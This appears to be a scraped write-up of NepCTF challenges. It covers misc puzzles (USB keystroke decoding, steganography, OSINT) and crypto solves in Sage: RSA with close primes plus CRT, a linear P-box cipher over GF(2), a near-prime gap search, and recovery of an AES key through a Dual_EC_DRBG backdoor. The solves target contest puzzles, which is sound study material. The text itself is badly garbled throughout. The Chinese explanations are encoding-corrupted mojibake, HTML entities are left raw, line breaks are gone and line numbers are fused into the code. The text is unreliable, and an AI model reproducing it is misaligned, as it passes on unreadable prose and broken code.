&quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#x27;out.txt&#x27;)for line in keys: try: if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;] else: output += [&#x27;[unknown]&#x27;] except: passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)): try: a=output.index(&#x27;&lt;DEL&gt;&#x27;) del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint (&#x27;output :&#x27; + &quot;&quot;.join(output)) å¾—åˆ° welcometonepctf2ndï¼ŒåŠ åˆ†éš”ç¬¦å¾—flagï¼šnepctf&#123;welcome_to_nepctf_2nd&#125;ã€‚ â€‹ èŠ±èŠ±ç”»ç”»ç”»èŠ±èŠ± èŠ±èŠ±ç”»äº†ä¸€å¼ å›¾ï¼Œä½ èƒ½çœ‹å‡ºæ¥å¥¹ç”»çš„æ˜¯ä»€ä¹ˆå— (flagæ ¼å¼ä¸ºNepCTF{}) åœ¨ osu! wiki å¯ä»¥å‘ç°oszæ–‡ä»¶ä¸ºå¯æ‰§è¡Œçš„osu!è°±é¢æ–‡ä»¶ï¼Œä¸‹è½½å®‰è£…osu!ï¼Œ æ ¹æ® ç”Ÿæˆçš„ .osz æ–‡ä»¶ä¼šè¢«æ”¾ç½®åœ¨ osu! æ–‡ä»¶å¤¹ä¸‹çš„ &quot;Exports&quot; æ–‡ä»¶å¤¹é‡Œï¼Œå°†oszæ–‡ä»¶æ”¾å…¥ Exports æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€osu!ï¼Œ åœ¨Edité¡µé¢çœ‹å®Œæ•´é¦–æ­Œæ›²çš„ä¹è°±è½¨è¿¹ï¼Œæ‹¿åˆ°flagï¼šNepCTF&#123;MASTER_OF_åå¥³äººï¼&#125;ã€‚ â€‹ å°‘è§çš„bbbbase å°‘è§çš„bbbbase å°è¯•å‡ ç§å¸¸è§jpgéšå†™ï¼Œå‘ç°æ˜¯jphideéšå†™ï¼Œç”¨JPHSå·¥å…·seekï¼ˆæ— å¯†ç ï¼‰ï¼Œå¾—åˆ° KkYWdvCQcLYewSUUy5TtQc9AMa base58è§£å¾—flagï¼šflag&#123;Real_qiandao~&#125;ã€‚ â€‹ 9ç‚¹ç›´æ’­ å„ä½åŒå­¦ï¼Œæ¯”èµ›å·²ç»å¼€å§‹å°†è¿‘åä¸ªå°æ—¶å•¦ï¼Œå¤§å®¶ç©çš„å¦‚ä½•å‘¢ï¼Ÿé‚€è¯·å¤§å®¶9ç‚¹æ¥ç›´æ’­é—´èŠèŠå¤©~ è¯·é”å®šhttps://b23.tv/bn0pPARè¿™è¾¹å°åŠ©æ‰‹æ”¶åˆ°äº†å¤§å®¶æƒ³æš´æ‰“å‡ºé¢˜äººçš„åé¦ˆï¼Œä»Šæ™š9ç‚¹æˆ‘ä»¬è¯·åˆ°äº†å˜æ€çš„å‡ºé¢˜äººä»¬ï¼Œåœ¨ç›´æ’­é—´å’Œå¤§å®¶äº¤æµï¼Œæ”¾å‡ºæˆ‘ä»¬çš„hintï¼Œå¸®åŠ©å¤§å®¶è§£é¢˜ã€‚åŒæ—¶ä¹Ÿä¼šåœ¨ç›´æ’­é—´ä¸­æŠ½å¹¸è¿çš„å°ä¼™ä¼´é€å‡ºæˆ‘ä»¬çš„å‘¨è¾¹ç¤¼å“ã€‚ çœ‹Bç«™ç›´æ’­æ‹¿flagï¼šNepCTF&#123;bad_woman_nb!&#125;ã€‚ â€‹ é¦…é¥¼ï¼Ÿé™·é˜±ï¼ å¥½å…„å¼Ÿä¸­å¥–äº†ï¼Œä½†æ˜¯è¦å…ˆæ±‡æ¬¾ã€‚ä»–å»å“ªäº†ï¼Ÿ NepCTF{é“¶è¡Œå®˜ç½‘ç½‘å€} OSINTé¢˜ã€‚ ç”¨Yandexè¯†åˆ«å›¾1é‡Œçš„é»„è‰²å»ºç­‘ï¼Œå¯å¾—åˆ°ç»“æœä¸ºè±ªå¨æµ·æ™¯å¤§é…’åº—ï¼Œå†åœ¨ç™¾åº¦åœ°å›¾é‡Œæœç´¢åœ¨æµ·å—ä¸‰äºšï¼Œé™„è¿‘é“¶è¡Œä¸ºå…‰å¤§é“¶è¡Œï¼Œ å®˜ç½‘ç½‘å€å³flagï¼šNepCTF&#123;www.cebbank.com&#125;ã€‚ â€‹ é—®å· https://www.wjx.cn/vm/mjlLAVV.aspx ç­”é—®å·æš´æ‰“å‡ºé¢˜äººï¼Œæ‹¿flagï¼šNepCTF&#123;see_you_NepCTF_2023&#125;ã€‚ â€‹ CRYPTOsignin æœ¬é¢˜flagæ ¼å¼: NepCTF{xxx} Have you heard of the Chinese Remainder Theorem? 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from Crypto.Util.number import getStrongPrime,bytes_to_longfrom gmpy2 import powmod,is_prime,invert,bit_length, next_primefrom FLAG import flagdef gen_key(): (p,q,n,e,d) = (0 for _ in range(5)) p = getStrongPrime(1024) q = next_prime(p)# q = p + 1# while(True):# q += 2 if q &amp; 1 else 1# if is_prime(q, 30):# break n = p*q e = 0x10001 d = invert(e, (p-1)*(q-1)) par = (p,q,n,e,d) return pardef leak(par, c): assert len(par) == 5 (p,q,n,e,d) = par print(&quot;Here&#x27;s something for you.&quot;) print(&quot;n =&quot;,n) print(&quot;e =&quot;,e) print(&quot;c_mod_p =&quot;,c % p) print(&quot;c_mod_q =&quot;,c % q)def enc(message, par): assert len(par) == 5 (p,q,n,e,d) = par m = bytes_to_long(message) c = powmod(m,e,n) return cif __name__ == &#x27;__main__&#x27;: par = gen_key() c = enc(flag, par) leak(par, c)&quot;&quot;&quot;Here&#x27;s something for you.n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791e = 65537c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922&quot;&quot;&quot; è´¹é©¬åˆ†è§£å’ŒCRTåº”ç”¨ã€‚ 123456789101112131415161718# Sageimport gmpy2n =q = gmpy2.iroot(n,2)[0]while 1: q = gmpy2.next_prime(q) if n%q == 0: breakp = n//qcp =cq =e = 65537c = crt([cp,cq],[p,q])d = inverse_mod(e,(p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27; â€‹ p or s æœ¬é¢˜flagæ ¼å¼: flag{xxx} what are the differences between P and Sï¼Ÿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from secret import keysfrom Crypto.Util.number import *assert(len(keys)==6)Pbox=[[0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31],[0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29],[0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31],[0, 2, 3, 5, 6, 7, 8, 13, 16, 19, 21, 25, 26, 27, 28],[2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31],[2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31],[1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31],[0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28],[1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31],[0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28],[0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30],[1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31],[0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30],[0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30],[2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31],[0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30],[3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30],[1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28],[0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30],[3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30],[0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31],[0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31],[3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29],[0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31],[0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31],[5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28],[1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31],[2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31],[0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27],[0, 1, 3, 4, 12, 16, 18, 19, 26, 30]]def enc(v): t=v for i in keys: q=[] for j in Pbox: q.append(sum([t[k] for k in j])%2) t=[int(q[j])^int(i[j]) for j in range(32)] return tassert(len(flag)==32)fb=bin(bytes_to_long(flag))[2:].zfill(32*8)ciphertext=&quot;&quot;for i in range(0,len(fb),32): t=enc([int(j) for j in fb[i:i+32]]) ciphertext+=&quot;&quot;.join([str(j) for j in t])print(ciphertext)&quot;&quot;&quot;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&quot;&quot;&quot; ä»£ç é€»è¾‘ï¼šå°†flagäºŒè¿›åˆ¶32*8ä½01ä¸²åˆ†ä¸º8ç»„ï¼Œæ¯ä¸€ç»„éƒ½å…ˆç»è¿‡Pç›’æŒ‰ä½é€‰æ‹©æ±‚å’Œè¿ç®—ï¼Œå†ä¸æœªçŸ¥çš„32ä½keyè¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ï¼Œå› ä¸ºæœ‰6ç»„keyï¼Œä¸Šè¿°ä¸¤æ­¥è¿ç®—å¾ªç¯è¿›è¡Œ6æ¬¡æ“ä½œï¼Œå¾—åˆ°æœ€ç»ˆ32ä½å¯†æ–‡ã€‚ å°†åŠ å¯†è¿‡ç¨‹è½¬ä¸º $\\text{GF}(2)$ ä¸‹çš„çŸ©é˜µè¿ç®—ï¼Œ$M_i$ ä¸º 1x32 æ˜æ–‡çŸ©é˜µ $(0 \\le i \\lt 8)$ï¼Œ$P$ ä¸º 32x32 Pç›’çŸ©é˜µï¼Œ$K_i$ ä¸º 1x32 keyçŸ©é˜µ $(0 \\le i \\lt 6)$ï¼Œ$T_i$ ä¸ºä¸­é—´çŸ©é˜µ $(0 \\le i \\lt 6)$ï¼Œ$C$ ä¸ºå¯†æ–‡çŸ©é˜µï¼Œå³ï¼š $T_0=M_i$ $T_1=T_0P^{-1}+K_0$ $T_2=T_1P^{-1}+K_1$ $T_3=T_2P^{-1}+K_2$ $T_4=T_3P^{-1}+K_3$ $T_5=T_4P^{-1}+K_4$ $T_6=T_5P^{-1}+K_5=C$ å¯å¾—ï¼š $C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$ ç”±äº $K_i$ å’Œ $P$ éƒ½å›ºå®šï¼Œä»¤ $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$ï¼Œ æœ‰ $C=M_iA+B$ï¼Œå…¶ä¸­ $A,B$ éƒ½ä¸ºå›ºå®šå€¼ï¼Œ$A$ å¯æ±‚ï¼Œ$B$ æœªçŸ¥ã€‚ çŒœæµ‹ $M_0$ å¯¹åº”çš„æ˜æ–‡æ˜¯ flagï¼Œåˆ™ç”± $M_0,C_0$å¯ä»¥å¾—å‡º $B$ï¼Œå†å¯¹ $C_1$ è‡³ $C_5$ åˆ†åˆ«æ±‚é€†è¿ç®—å¯å¾— $M_1$ è‡³ $M_5$ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# SageP = [[0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31],[0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29],[0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31],[0, 2, 3, 5, 6, 7, 8, 13, 16, 19, 21, 25, 26, 27, 28],[2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31],[2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31],[1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31],[0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28],[1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31],[0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28],[0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30],[1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31],[0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30],[0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30],[2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31],[0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30],[3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30],[1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28],[0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30],[3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30],[0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31],[0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31],[3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29],[0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31],[0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31],[5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28],[1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31],[2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31],[0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27],[0, 1, 3, 4, 12, 16, 18, 19, 26, 30]]PP = zero_matrix(GF(2),32)for k in range(32): PP[k] = [1 if x in P[k] else 0 for x in range(32)]PPt = PP.transpose()c = &#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;C = zero_matrix(GF(2),8,32)for k in range(0,len(c),32): C[k//32] = [1 if x == &#x27;1&#x27; else 0 for x in c[k:k+32]]print(C)f0 = vector(GF(2),list(bin(int(b&#x27;flag&#x27;.hex(),16))[2:].zfill(4*8)))flag = b&#x27;flag&#x27;tmp = C[0] - (f0*(PPt^6))print(tmp)for k in range(1,8): l = list((C[k]-tmp)*PPt^(-6)) flag += bytes.fromhex(hex(int(&#x27;&#x27;.join([str(i) for i in l]),2))[2:]) print(flag)# b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27; â€‹ ä¸­å­¦æ•°å­¦ æœ¬é¢˜flagæ ¼å¼: flag{xxx} Zuni: å¬è¯´å¯†ç å­¦æ˜¯å°å­¦æ•°å­¦æ¥ç€ï¼Ÿ // éšç¼˜è¯„ï¼šçœŸçš„å— 123456789101112131415161718192021from gmpy2 import *from Crypto.Util.number import *from secret import flagp=getPrime(1024)q=next_prime(p+(p&gt;&gt;500))e=0x10001n=p*qc=pow(bytes_to_long(flag),e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)&#x27;&#x27;&#x27;n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186&#x27;&#x27;&#x27; $p,q$ æ¥è¿‘ï¼Œä¸”å‰1024-500ä½ç›¸åŒï¼Œæœ‰ $\\sqrt{n}&gt;&gt;500 \\approx p&gt;&gt;500 \\approx q-p$ï¼Œæ•…å¯çˆ†ç ´æ‰¾å·®å€¼ $k$ï¼š 1234567891011121314151617181920212223242526272829303132# Sageimport gmpy2import itertoolsfrom tqdm import *def solve(f1, f2): g = f1.resultant(f2, q) roots = g.univariate_polynomial().roots() if len(roots) == 0: return False p_ = abs(roots[0][0]) q_ = abs(roots[1][0]) return (min(p_, q_), max(p_, q_))n = c = e = 65537x = int(gmpy2.iroot(n,2)[0])xh = x &gt;&gt; 500for k in trange(1000000,10000000): d = xh - k P.&lt;p, q&gt; = PolynomialRing(ZZ) f1 = n - p*q f2 = d - (q - p) res = solve(f1, f2) if res: print(k) print(res) break # 5476332# (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911) å†å¸¸è§„è§£ï¼š 1234567891011p = q = n = c = e = 65537f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27; â€‹ bd_key æœ¬é¢˜flagæ ¼å¼: NepCTF{xxx} master of pwnä¸€ä¸‹å°±è§£å‡ºäº†æ˜æ–‡ï¼Œå› ä¸ºæœ‰åé—¨ï¼ˆæœ¬é¢˜ä¸pwnæ— å…³ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrimefrom FLAG import flag&quot;&quot;&quot; Note: I have modified Dual_EC a little bit. It would be EASIER for you to exploit it.&quot;&quot;&quot;class Dual_EC(): def __init__(self, s_0=None): from Crypto.Util.number import getRandomNBitInteger # Init curve P-256 self.p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 self.n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 self.b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b self.curve = EllipticCurve(GF(self.p), [-3, self.b]) # Init P, Q self.Qx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296 self.Qy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5 self.Q = self.curve(self.Qx, self.Qy) self.d = getRandomNBitInteger(256) self.P = self.d * self.Q # Init state, h_adin if s_0 == None: self.s_i = int(floor((2^16-1)*random())) else: self.s_i = s_0 self.h_adin = 0 self.__leak_par() def __leak_par(self): print(f&quot;curve = &#123;self.curve&#125;&quot;) print(f&quot;P = &#123;self.P&#125;&quot;) print(f&quot;d = &#123;self.d&#125;&quot;) print(f&quot;Q = &#123;self.Q&#125;&quot;) # Output 32bytes now. def __Dual_EC_DRBG(self, h_adin = 0): t_i = self.s_i ^^ h_adin self.s_i = (t_i*self.P)[0].lift() r_i = (self.s_i*self.Q)[0].lift() return r_i def getRandomNBytes(self, N:int) -&gt; bytes: result = 0 req = (N/32).ceil() for i in range(req): if(i == 0): result = (result &lt;&lt; (32*8)) | self.__Dual_EC_DRBG(self.h_adin) else: result = (result &lt;&lt; (32*8)) | self.__Dual_EC_DRBG() self.s_i = (self.s_i * self.P)[0].lift() result = result &gt;&gt; ((32*req - N)*8) return long_to_bytes(result) def encrypt_flag(key:bytes) -&gt; bytes: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from FLAG3 import flag cipher = AES.new(key, AES.MODE_ECB) flag_pad = pad(flag, 16) ct = cipher.encrypt(flag_pad) return ctdef do_schnorr_identification(dbrg): p = getPrime(256) Zp = Zmod(p) g = Zp(2) q = g.multiplicative_order() Zq = Zmod(q) k = 10 class SchnorrProver(object): def __init__(self): self.secret_key = Zq.random_element() self.public_key = g^self.secret_key def commit(self): self.r = Zq.random_element() return g^self.r def respond(self, challenge): return self.r - challenge*self.secret_key class SchnorrVerifier(object): def __init__(self, prover_public_key): self.prover_public_key = prover_public_key def challenge(self, commitment): self.commitment = commitment while True: c = bytes_to_long(dbrg.getRandomNBytes(32)) if c &lt; p: break self.challenge_number = c return self.challenge_number def check(self, response): check_value = g^response*self.prover_public_key^self.challenge_number return self.commitment == check_value def run_protocol(iterations=1): for _ in range(iterations): prover = SchnorrProver() verifier = SchnorrVerifier(prover.public_key) t = prover.commit() c = verifier.challenge(t) s = prover.respond(c) assert(verifier.check(s)) print(f&quot;c = &#123;c&#125;&quot;) run_protocol() def main(): dbrg = Dual_EC() do_schnorr_identification(dbrg) key = dbrg.getRandomNBytes(16) ct = encrypt_flag(key) print(f&quot;ct = &#123;bytes_to_long(ct)&#125;&quot;)main() 123456# curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951# P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)# d = 66604141534275704476445937214374130642068729921454877238730830814793201802544# Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)# c = 59100197418944667413449341413044666843726352095054393072750502893110293231642# ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176 åŒæ¤­åœ†æ›²çº¿ç¡®å®šæ€§éšæœºæ•°å‘ç”Ÿå™¨ï¼ˆDual_EC_DRBGï¼‰çš„ä¸€ä¸ªåé—¨ï¼ŒåŸç†ï¼š è®¾æ¯ä¸€æ­¥çš„ $\\text{state}$ ä¸º $s_i$ï¼Œéšæœºæ•°ä¸º $r_i$ï¼Œéšæœºæ•°å¯¹åº”çš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ä¸º $R_i$ã€‚ å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå·²çŸ¥ $P$ã€$Q$ã€$d$ã€$r_{i-1}$ï¼Œè€Œ $s_i$ æœªçŸ¥ã€‚äºæ˜¯æœ‰ï¼š $\\begin{cases} ((s_i \\cdot P)_x \\cdot P)_x &amp; \\rightarrow s_{i+1} \\newline ((s_i \\cdot P)_x \\cdot Q)_x &amp; \\rightarrow r_i \\end{cases}$ åé—¨ä¸ºæ„é€  $d \\cdot r_{i-1}$ï¼Œå…¶æ°å¥½æ˜¯ $s_i$ï¼Œçœ‹ä¼¼å®‰å…¨çš„ä½“åˆ¶è¢«æ”»ç ´ã€‚ è®° $k_i = (s_i \\cdot P)_x$ï¼Œæœ‰ï¼š $\\begin{align} d \\cdot r_{i-1} &amp; = {(d \\cdot R_{i-1})_x = (d \\cdot k_{i-1} \\cdot Q)_x} = {(k_{i-1} \\cdot d \\cdot Q)_x = (k_{i-1} \\cdot P)_x} = {((s_{i-1} \\cdot P)_x \\cdot P)_x = s_i} \\end{align}$ é¢˜é‡Œ $c=r_{i-1}$ï¼Œæ„é€  $d \\cdot c = s_i$ï¼Œåˆ™å¯ä»¥æ¨å‡ºä¸‹ä¸€ä¸ªéšæœºæ•° $r_i=((s_i \\cdot P)_x \\cdot Q)_x$ï¼Œå–é«˜16*8ä½ä¸ºAESçš„Keyã€‚ 1234567891011121314151617181920212223242526272829# Sagefrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESa = 115792089210356248762697446949407573530086143415290314195533631308867097853948b = 41058363725152142129326129780047268409114441015993725554835256314039467401291p = 115792089210356248762697446949407573530086143415290314195533631308867097853951E = EllipticCurve(GF(p),[a,b])n = 115792089210356248762697446949407573529996955224135760342422259061068512044369P = (72696788778535848020209987825324097844942627382508830211685965810687985426258, 49180397040468497821240854375656422791216946832858522054245540263375986110762)d = 66604141534275704476445937214374130642068729921454877238730830814793201802544Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286, 36134250956749795798585127919587881956611106672985015071877198253568414405109)c = 59100197418944667413449341413044666843726352095054393072750502893110293231642ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176P = E(P)Q = E(Q)R0 = E.lift_x(c)s1 = (d*R0)[0]s2 = ((s1*P)[0]*P)[0]r1 = ((s1*P)[0]*Q)[0]key = r1 &gt;&gt; ((32 - 16)*8)cipher = AES.new(key, AES.MODE_ECB)key = long_to_bytes(key)ct = long_to_bytes(ct)print(cipher.decrypt(ct))# b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\\x01&#x27; â€‹ timing ç‰¢ä¸å¯ç 